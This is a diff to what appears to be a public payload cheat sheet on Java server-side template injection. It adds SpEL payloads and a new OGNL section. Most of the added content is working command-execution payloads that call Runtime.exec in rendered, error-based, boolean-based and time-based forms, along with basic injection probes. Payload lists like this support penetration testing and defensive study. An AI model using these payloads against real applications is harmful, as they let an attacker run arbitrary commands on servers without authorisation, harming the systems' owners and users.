@@ -35,6 +35,9 @@
     - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)
     - [SpEL - Session Attributes](#spel---session-attributes)
     - [SpEL - Command Execution](#spel---command-execution)
+- [Object-Graph Navigation Language](#object-graph-navigation-language)
+    - [OGNL - Basic Injection](#ognl---basic-injection)
+    - [OGNL - Command Execution](#ognl---command-execution)
 - [References](#references)
 
 ## Templating Libraries
@@ -46,7 +49,7 @@
 | Groovy        | `${ }`                 |
 | Jinjava       | `{{ }}`                |
 | Pebble        | `{{ }}`                |
-| Spring        | `*{ }`                 |
+| SpEL          | `*{ }`, `#{ }`, `${ }` |
 | Thymeleaf     | `[[ ]]`                |
 | Velocity      | `#set($X="") $X`       |
 
@@ -367,9 +370,12 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 
 ### SpEL - Basic Injection
 
+> SpEL has built-in templating system using #{ }, but SpEL is also commonly used for interpolation using ${ }
+
 ```java
 ${7*7}
 ${'patt'.toString().replace('a', 'x')}
+${T(java.lang.Integer).valueOf('1')}
 ```
 
 ### SpEL - Retrieve Environment Variables
@@ -440,6 +446,65 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
     ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
     ${request.getAttribute("a")}
     ```
+- Error-Based payload:
+  
+    ```java
+    ${T(java.lang.Integer).valueOf("x"+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec("id").inputStream.readAllBytes()))}
+    ```
+  
+- Boolean-Based payload:
+  
+    ```java
+    ${1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""}
+    ```
+  
+- Time-Based payload:
+  
+    ```java
+    ${(T(java.lang.Runtime).getRuntime().exec("id").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}
+    ```
+
+## Object-Graph Navigation Language
+
+[Official website](https://commons.apache.org/dormant/commons-ognl/)
+
+> OGNL stands for Object-Graph Navigation Language; it is an expression language for getting and setting properties of Java objects, plus other extras such as list projection and selection and lambda expressions. You use the same expression for both getting and setting the value of a property.
+
+### OGNL - Basic Injection
+
+> OGNL can be used with different tags like ${ }
+
+```java
+7*7
+'patt'.toString().replace('a', 'x')
+@java.lang.Integer@valueOf('1')
+```
+
+### OGNL - Command Execution
+
+Rendered:
+
+```java
+new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
+```
+
+Error-Based:
+
+```java
+(new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes()))/0
+```
+
+Boolean-Based:
+
+```java
+1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""
+```
+
+Time-Based:
+
+```java
+((@java.lang.Runtime@getRuntime().exec("id").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)
+```
 
 ## References
 
